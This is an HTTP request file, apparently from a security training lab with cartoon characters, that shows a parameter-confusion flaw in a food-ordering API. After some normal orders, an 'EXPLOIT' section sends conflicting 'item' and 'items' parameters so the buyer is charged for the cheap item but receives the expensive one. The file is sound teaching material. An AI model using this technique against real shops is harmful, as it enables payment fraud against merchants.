# @import ../common/setup.http
@host = {{base_host}}/v101

# Sandy releases a new app version that lets customers order multiple items at once.
# (Previously, the app only supported adding a single promotional combo per order)

# Named variables for menu items (avoid magic numbers)
@krabby_patty = 4
@fries = 5
@kelp_shake = 6

### Reset balances for idempotent demo
{{
  await seedBalance("v101", "plankton", 100);
  await seedBalance("v101", "patrick", 100);
  await seedBalance("v101", "spongebob", 100);
}}
GET /account/credits
Authorization: {{plankton_auth}}

?? status == 200


# --- Legitimate Usage: Patrick orders multiple items using the new 'items' parameter ---

### Patrick places an order with multiple items via the updated app.
POST /orders
Authorization: {{patrick_auth}}
Content-Type: application/x-www-form-urlencoded

items={{krabby_patty}}&items={{fries}}&delivery_address=Under the Rock

?? status == 201


### Check Patrick's orders to confirm the multi-item order was created.
GET /orders
Authorization: {{patrick_auth}}

?? status == 200


# --- Legitimate Usage: SpongeBob orders a single item using the legacy 'item' parameter ---

### SpongeBob orders via older app version that only lets him place a single-item order.
POST /orders
Authorization: {{spongebob_auth}}
Content-Type: application/x-www-form-urlencoded

item={{krabby_patty}}&delivery_address=Pineapple House

?? status == 201


### Check SpongeBob's orders to confirm the single-item order.
GET /orders
Authorization: {{spongebob_auth}}

?? status == 200


# --- Exploit: Plankton pays for cheap item but receives the more expensive one ---

### First, check Plankton's balance before the exploit.
# @name initial_balance
GET /account/credits
Authorization: {{plankton_auth}}

?? status == 200

{{
  console.info(`Balance BEFORE: $${response.parsedBody.balance}`);
}}


### Get the menu to identify cheap vs expensive items
# @name menu
GET /menu

{{
  const { cheap, expensive } = pickMenuExtremes(response.parsedBody);
  exports.cheap_item = cheap;
  exports.expensive_item = expensive;
}}

?? status == 200

{{
  console.info(`Menu: ${cheap_item.name} ($${cheap_item.price}) vs ${expensive_item.name} ($${expensive_item.price})`);
}}


### EXPLOIT: Plankton submits conflicting `item` and `items` parameters
# @name exploit_order
POST /orders
Authorization: {{plankton_auth}}
Content-Type: application/x-www-form-urlencoded

item={{cheap_item.id}}&items={{expensive_item.id}}&delivery_address=Chum Bucket

?? status == 201
?? js response.parsedBody.total == {{cheap_item.price}}
?? js response.parsedBody.items[0].name == {{expensive_item.name}}


### Check Plankton's balance after exploit
GET /account/credits
Authorization: {{plankton_auth}}

?? status == 200

{{
  const before = parseFloat(initial_balance.balance);
  const after = parseFloat(response.parsedBody.balance);
  console.info(`IMPACT: Paid $${(before - after).toFixed(2)} for ${cheap_item.name}, received ${expensive_item.name} worth $${expensive_item.price}!`);
}}


### Check Plankton's orders to confirm expensive item was received
GET /orders
Authorization: {{plankton_auth}}

?? status == 200
